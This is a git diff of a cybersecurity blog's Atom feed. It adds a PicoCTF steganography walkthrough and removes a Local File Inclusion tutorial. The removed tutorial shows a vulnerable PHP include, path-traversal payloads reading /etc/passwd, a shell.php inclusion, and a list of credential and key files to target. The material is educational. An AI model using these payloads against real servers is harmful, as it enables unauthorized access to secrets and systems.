@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-10T17:07:06-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Quantum Scrambler (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html" rel="alternate" type="text/html" title="Quantum Scrambler (PicoCTF)" /><published>2025-06-05T00:00:00-04:00</published><updated>2025-06-05T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_spider_humanoid_in_the_style_of_retro-futuris_fb89e2a2-e804-46ab-90c7-d8fd55328bc8.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-12T18:59:06-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Quantum Scrambler (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html" rel="alternate" type="text/html" title="Quantum Scrambler (PicoCTF)" /><published>2025-06-05T00:00:00-04:00</published><updated>2025-06-05T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_spider_humanoid_in_the_style_of_retro-futuris_fb89e2a2-e804-46ab-90c7-d8fd55328bc8.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
 
 <h1 id="reverse-engineering-a-recursive-scramble-in-python-picoctf-challenge-breakdown">Reverse Engineering a Recursive Scramble in Python picoCTF Challenge Breakdown</h1>
 
@@ -3472,7 +3472,91 @@ Click any image to view it in full screen.
 
 <ul>
   <li><a href="https://www.bellingcat.com/resources/how-tos/2019/12/26/guide-to-using-reverse-image-search-for-investigations/">Guide to Using Reverse Image Search for Investigations (Bellingcat)</a></li>
-</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Active Directory</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html" rel="alternate" type="text/html" title="Active Directory" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_satanic_computer_hackers_degen_dark_det_in_the_style_of_7e887c3c-d4a4-40d5-8718-097dc099bb36.png" alt="Set up Listener" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">READ (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/REDpicoCTF.html" rel="alternate" type="text/html" title="READ (PicoCTF)" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/REDpicoCTF</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/REDpicoCTF.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_giant_all-seeing_eye_glowing_neon_red_cables_retro_cybe_ea231a51-2642-42ce-b800-7f860e1f6a66.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+
+<div style="background: #181c20; border: 2.5px solid #e74c3c; border-radius: 12px; padding: 22px 26px; margin: 36px 0 32px; box-shadow: 0 4px 18px rgba(231,76,60,0.10); color: #f8f8f2; font-size: 1.13em; font-family: 'Fira Mono', 'Consolas', monospace;">
+  <div style="font-weight: bold; font-size: 1.22em; letter-spacing: 0.04em; color: #ff5555; margin-bottom: 10px;">
+    Challenge: RED (PicoCTF)
+  </div>
+  <div style="margin-bottom: 12px;">
+    <strong>Description:</strong><br />
+    RED, RED, RED, RED<br />
+  </div>
+  <a href="https://challenge-files.picoctf.net/c_verbal_sleep/831307718b34193b288dde31e557484876fb84978b5818e2627e453a54aa9ba6/red.png" style="color: #ffb86c; text-decoration: underline; font-weight: bold;">
+    &#128190; Download: red.png
+  </a>
+</div>
+
+<h2 id="solution-walkthrough">Solution Walkthrough</h2>
+
+<ol>
+  <li><strong>Initial Inspection</strong><br />
+After downloading and opening the image, I noticed a red square. To gather more information, I used <code class="language-plaintext highlighter-rouge">exiftool</code> to check the image metadata.</li>
+</ol>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*7NkoszjlLKQpeKZ3rPcpsg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:4000/format:webp/1*0JBicI9I0KxKKiEEBNEisQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<ol>
+  <li><strong>Finding the Hidden Poem</strong><br />
+In the metadata, I found a poem:</li>
+</ol>
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="terminal">
+   Crimson heart, vibrant and bold,
+   .Hearts flutter at your sight
+   ..Evenings glow softly red,
+   .Cherries burst with sweet life..
+   Kisses linger with your warmth..
+   Love deep as merlot..
+   Scarlet leaves falling softly,
+   .Bold in every stroke.
+</code></pre>
+</div>
+<p>By aligning the lines after each dot, the first letter of each line spells out: <strong>CHECKLSB</strong>.</p>
+
+<ol>
+  <li><strong>Researching LSB</strong><br />
+I wasn’t sure what “LSB” meant, so I searched online and learned about <strong>Least Significant Bit (LSB) steganography</strong> a technique for hiding data in images by modifying the least significant bits of pixel values.</li>
+</ol>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*_lyuWmT_Axwuqc-MiFA74g.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<ol>
+  <li><strong>Understanding LSB Steganography</strong>
+    <ul>
+      <li>The LSB is the rightmost bit in a binary number (e.g., in <code class="language-plaintext highlighter-rouge">10010010</code>, the last <code class="language-plaintext highlighter-rouge">0</code> is the LSB).</li>
+      <li>LSB steganography hides information by replacing these bits in the image’s color channels.</li>
+      <li>This method is popular because it doesn’t noticeably change the image.</li>
+    </ul>
+  </li>
+  <li><strong>Choosing the Right Tool</strong><br />
+I first considered <code class="language-plaintext highlighter-rouge">steghide</code>, but it doesn’t support PNG files. After some research, I found <a href="https://github.com/zed-0xff/zsteg"><code class="language-plaintext highlighter-rouge">zsteg</code></a>, a tool designed for detecting steganography in PNG and BMP images.</li>
+</ol>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*FeH_SHuuA2QeDLxE3GX6Qg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<ol>
+  <li><strong>Extracting the Hidden Data</strong><br />
+I installed <code class="language-plaintext highlighter-rouge">zsteg</code> (since it’s not pre-installed on Kali Linux) and ran it on the image. The tool revealed a message encoded in base64, multiple times.</li>
+</ol>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:3000/format:webp/1*TBm2PkEUVhEuNQ72ezillg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<ol>
+  <li><strong>Decoding the Message</strong><br />
+After decoding the base64 string several times, I finally obtained the flag!</li>
+</ol>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*24UtVzAOhW9l80TZJ0ioZQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Active Directory</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html" rel="alternate" type="text/html" title="Active Directory" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_satanic_computer_hackers_degen_dark_det_in_the_style_of_7e887c3c-d4a4-40d5-8718-097dc099bb36.png" alt="Set up Listener" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
 
 <p><strong>What is Active Directory?</strong>
 Active Directory is a service developed by Microsoft that helps manage and organize computers, users, and other resources on a network. Think of it like a digital phonebook + control center that stores info about everything in a Windows domain (like usernames, passwords, computers, printers, etc.).</p>
@@ -4463,824 +4547,4 @@ Date:   Sat Mar 9 21:09:01 2024 +0000
 
 <p>The intern………</p>
 
-<p>Thank you for reading.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Breaking Down Local File Inclusion (LFI)</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/lfi.html" rel="alternate" type="text/html" title="Breaking Down Local File Inclusion (LFI)" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/lfi</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/lfi.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_cosmic_black_hole_interstellar_uhd_burnedcharred_Osiris_40dc9ac1-aa11-454d-bdc4-d4a244a26d2b.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
-
-<h3 id="yo-whats-up-hackers-and-learners"><strong>Yo</strong> what’s up hackers and learners</h3>
-
-<p>Today, I wanna break down a classic web vuln that I recently got my head around: <strong>Local File Inclusion</strong>, aka <strong>LFI</strong>. If you’re diving into bug bounties, CTFs, or web pentesting just like me, this one’s a must-know. And trust me, once it clicks, it’s kinda beautiful in a terrifying way 😅.</p>
-
-<hr />
-
-<h4 id="-what-even-is-lfi">🧠 What Even Is LFI?</h4>
-
-<p>Local File Inclusion is a vulnerability where a web app lets a user include files on the <strong>server</strong>, either for viewing or execution. It’s often caused by PHP that are <strong>poorly</strong> written and implemented , <strong>improper input sanitization</strong> when user-controlled data is used in file path functions like:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-&lt;?php
-  include($_GET['page']);
-?&gt;
-</code></pre>
-</div>
-
-<p>Yup. That innocent <code class="language-plaintext highlighter-rouge">?page=about.php</code> can become something way more spicy.</p>
-
-<h2 id="exploiting-lfi">Exploiting LFI</h2>
-
-<p>So, we have this vulnerable web app with pages like <strong>home</strong>, <strong>about</strong>, and <strong>contact</strong>. When you look at the URLs, you’ll notice stuff like:</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GVcbe5osI3RMtpW5x6pwlw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7tHOCR6_h8B2gsfOtUSxDQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-/page.php?page=pages/home.php
-/page.php?page=pages/about.php
-/page.php?page=pages/contact.php
-</code></pre>
-</div>
-
-<p>Here’s the catch: the <code class="language-plaintext highlighter-rouge">page</code> parameter is vulnerable to <strong>Local File Inclusion (LFI)</strong>.</p>
-
-<p>What that means is instead of just loading those normal pages, you can mess with the input and try stuff like:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-/page.php?page=../../../../../../../etc/passwd
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7GsC3N8zbCSit16vX30yVg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p>you just read the server’s <strong>/etc/passwd</strong> file (if it’s a Linux box), which is a classic LFI move to prove the vulnerability exists.</p>
-
-<p>If you’re on Windows, try:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-/page.php?page=../../../../windows/win.ini
-</code></pre>
-</div>
-
-<p>Also, a sneaky trick is to check:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-/proc/self/environ
-</code></pre>
-</div>
-
-<p>Sometimes that leaks environment variables, and those can be <em>juicy</em> for further attacks.</p>
-
-<h3 id="what-is-the-risk-of-file-inclusion">What is the Risk of File Inclusion?</h3>
-
-<p>File inclusion vulnerabilities such as <strong>Local File Inclusion (LFI)</strong> and <strong>Remote File Inclusion (RFI)</strong> can pose serious risks to a web application. At their core, they allow attackers to force the application to load and execute files they shouldn’t have access to.</p>
-
-<h4 id="heres-why-its-dangerous">Here’s why it’s dangerous:</h4>
-
-<ol>
-  <li>
-    <p><strong>Sensitive File Disclosure</strong>:
-Attackers can read files on the server like:</p>
-
-    <ul>
-      <li>
-        <p><code class="language-plaintext highlighter-rouge">/etc/passwd</code> (Linux user info)</p>
-      </li>
-      <li>
-        <p>Application source code</p>
-      </li>
-      <li>
-        <p><code class="language-plaintext highlighter-rouge">.env</code> or config files (with API keys, DB creds, etc.)</p>
-      </li>
-    </ul>
-  </li>
-  <li>
-    <p><strong>Chaining to RCE</strong>:
-If the attacker can upload a file (e.g., via file upload or log injection), they might include that file via LFI to <strong>execute arbitrary code</strong> turning LFI into <strong>Remote Code Execution (RCE)</strong>.</p>
-  </li>
-  <li>
-    <p><strong>Server-Side Enumeration</strong>:
-File inclusion can also allow attackers to discover internal server paths or services by brute-forcing or fuzzing local paths.</p>
-  </li>
-  <li>
-    <p><strong>Privilege Escalation &amp; Pivoting</strong>:
-In some setups, included files might inherit privileges of the web server or expose credentials that can be used to move laterally or escalate access.</p>
-  </li>
-</ol>
-
-<hr />
-
-<h3 id="real-world-example">Real-World Example:</h3>
-
-<p>Imagine a PHP app with this line:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-include($_GET["page"]);
-</code></pre>
-</div>
-
-<p>If there’s no proper validation, an attacker can do:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://target.com/index.php?page=../../../../etc/passwd
-</code></pre>
-</div>
-
-<p>or</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://target.com/index.php?page=/uploads/shell.php
-</code></pre>
-</div>
-
-<p>Unauthorized file access + potential RCE = major compromise</p>
-
-<h2 id="what-is-a-path-traversal-vulnerability">What is a Path Traversal Vulnerability?</h2>
-
-<p><strong>Path Traversal</strong> (also called <strong>Directory Traversal</strong>) is a vulnerability that allows attackers to access files and directories <strong>outside the intended scope</strong> by manipulating input parameters that reference file paths.</p>
-
-<hr />
-
-<h4 id="why-it-happens">Why It Happens:</h4>
-
-<p>The vulnerability typically occurs when <strong>user input is used directly in file operations</strong> for example, reading a file using <a href="https://www.php.net/manual/en/function.file-get-contents.php"><code class="language-plaintext highlighter-rouge">file_get_contents()</code></a> in PHP <strong>without proper input validation</strong>.</p>
-
-<h4 id="important">Important:</h4>
-
-<p><code class="language-plaintext highlighter-rouge">file_get_contents()</code> <strong>is not inherently vulnerable</strong> the issue is when <strong>untrusted user input</strong> is passed directly into it.</p>
-
-<h3 id="what-does--really-mean">What Does ../../../../ Really Mean?</h3>
-
-<p><strong>Path Traversal</strong>, also known as the <strong>“dot-dot-slash” (../)</strong> attack, is a technique where an attacker manipulates file paths to <strong>move up the directory structure</strong> and access files that should be off-limits.</p>
-
-<h4 id="how-it-works">How It Works:</h4>
-
-<p>In many operating systems, <code class="language-plaintext highlighter-rouge">../</code> means “go up one directory.” By chaining multiple <code class="language-plaintext highlighter-rouge">../</code>, attackers can escape the intended folder and reach <strong>sensitive system or application files</strong>.</p>
-
-<h4 id="how--works">how ../../../../ Works</h4>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-# Create a demo directory structure
-<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> mkdir -p /tmp/demo/var/www/html/uploads
-<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> cd /tmp/demo/var/www/html/uploads
-
-# Show current path
-<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> pwd
-
-# Go up one directory
-<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> cd ..
-
-# Go up two more directories
-<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> cd ../..
-
-# Go back to the demo root
-<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> cd ../../../../
-
-# Create a fake sensitive file
-<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> echo "root:x:0:0:root:/root:/bin/bash" &gt; etc_passwd
-
-# Simulate a path traversal to access the file
-<span class="terminal-prompt">tobiasare@hacktheplanet:~$</span> cat var/www/html/uploads/../../../../etc_passwd
-  </code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DBNnmwsgX5ix3bLFOWVBBQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<h3 id="bypassing-filters-in-lfipath-traversal-know-your-target-files">Bypassing Filters in LFI/Path Traversal Know Your Target Files</h3>
-
-<p>Sometimes, devs try to protect against file inclusion or path traversal by filtering out obvious payloads. But if you’re testing an app, knowing <strong>which OS-level files to target</strong> can help you validate vulnerabilities, bypass weak filters, or escalate further.</p>
-
-<p>Below are some <strong>commonly accessed system files</strong> on Linux and Windows that can leak juicy info:</p>
-
-<hr />
-
-<h3 id="linux-targets"><strong>Linux Targets</strong></h3>
-
-<table>
-  <thead>
-    <tr>
-      <th>Location</th>
-      <th>Description</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">/etc/issue</code></td>
-      <td>Displays the system’s pre-login message or banner. Can reveal OS flavor/version.</td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">/etc/profile</code></td>
-      <td>Defines global environment variables (e.g., <code class="language-plaintext highlighter-rouge">PATH</code>, <code class="language-plaintext highlighter-rouge">umask</code>) applies to all users.</td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">/proc/version</code></td>
-      <td>Contains the Linux kernel version useful for kernel-based exploits.</td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">/etc/passwd</code></td>
-      <td>Lists all local users. Doesn’t store passwords (that’s <code class="language-plaintext highlighter-rouge">/etc/shadow</code>).</td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">/etc/shadow</code></td>
-      <td>Stores hashed passwords for user accounts (root access required). Goldmine for cracking.</td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">/root/.bash_history</code></td>
-      <td>Shows commands run by the root user often reveals passwords, configs, etc.</td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">/var/log/dmesg</code></td>
-      <td>Contains kernel ring buffer messages useful for debugging hardware and system info.</td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">/var/mail/root</code></td>
-      <td>Stores root’s local email might contain alerts, logs, or tool output.</td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code></td>
-      <td>Root’s private SSH key compromise this = full system access.</td>
-    </tr>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">/var/log/apache2/access.log</code></td>
-      <td>Shows every request to the Apache server. Great for <strong>log poisoning</strong> or recon.</td>
-    </tr>
-  </tbody>
-</table>
-
-<hr />
-
-<h3 id="windows-targets"><strong>Windows Targets</strong></h3>
-
-<table>
-  <thead>
-    <tr>
-      <th>Location</th>
-      <th>Description</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><code class="language-plaintext highlighter-rouge">C:\boot.ini</code></td>
-      <td>Legacy file for boot config on BIOS-based systems. Leaks OS and bootloader info.</td>
-    </tr>
-  </tbody>
-</table>
-
-<h2 id="black-box-lfi-testing-with-null-byte-injection">Black Box LFI Testing with Null Byte Injection</h2>
-
-<p>When you don’t have any info about a web application (black box testing), you have to start by probing it with random inputs for example, using the <code class="language-plaintext highlighter-rouge">lang</code> parameter with some random value like <code class="language-plaintext highlighter-rouge">hello</code>.</p>
-
-<p>Say you have this URL:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-pagebypassnulbyte.php?lang=EN
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HOYCSmUmIPOG80h14MWIlw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
